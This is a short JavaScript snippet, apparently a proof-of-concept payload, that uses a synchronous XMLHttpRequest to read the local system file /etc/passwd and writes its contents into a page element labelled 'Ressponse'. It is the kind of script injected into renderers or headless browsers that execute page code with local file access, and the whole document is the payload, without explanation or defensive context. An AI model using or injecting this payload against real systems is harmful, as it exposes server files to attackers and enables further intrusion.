var x = new XMLHttpRequest();
x.open("GET", "file:///etc/passwd", false);
x.send();
document.getElementById('response').innerHTML = "Ressponse:\n\n" + x.responseText;
